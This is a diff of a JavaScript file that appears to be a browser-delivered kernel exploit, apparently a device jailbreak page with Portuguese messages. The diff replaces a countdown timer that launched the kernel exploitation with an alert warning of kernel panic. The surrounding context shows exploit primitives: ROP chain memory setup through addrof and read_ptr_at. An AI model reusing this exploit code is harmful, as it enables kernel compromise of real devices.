@@ -1,21 +1,8 @@
 var ropchain_array = new Uint32Array(482118);
 var ropchain = read_ptr_at(addrof(ropchain_array)+0x10);
 
-document.getElementById("myProgress").remove();
-var timeleft = 60;
-var downloadTimer = setInterval(function(){
-  document.getElementById("tempo").innerHTML = "<br><br><br><font style='color:#ee596f'>A G U A R D E !</font><br><br>Tempo restante: <font style='color:#ee596f'>" + timeleft + "</font> segundos<br><br><font style='color:#ee596f'>Método MSZ_MGS (com alteração)</font>";
-  timeleft -= 1;
-  if(timeleft <= -1){
-    clearInterval(downloadTimer);
-	document.getElementById("tempo").remove();    
-	document.getElementById("progress").innerHTML = "Agora, executando a exploração do kernel (<font style='color:#ee596f'>risco de kp</font>).";
- 	contraKP();
-	//setTimeout(function(){contraKP();}, 500);
-  }
-}, 1000);
+alert("\nNa tentativa de obter uma maior taxa de sucesso, você pode aguardar 2 minutos\nantes de clicar no botão \"OK\". (aqui pode ocorrer kernel panic)");
 
-function contraKP(){
 var ropchain_offset = 2;
 function set_gadget(val)
 {
@@ -150682,4 +150669,3 @@ var printf_ans = read_mem_as_string(printf_buf, printf_buf_end-printf_buf);
 var _ = malloc_nogc.pop();
 var _ = malloc_nogc.pop();
 var _ = malloc_nogc.pop();
-}
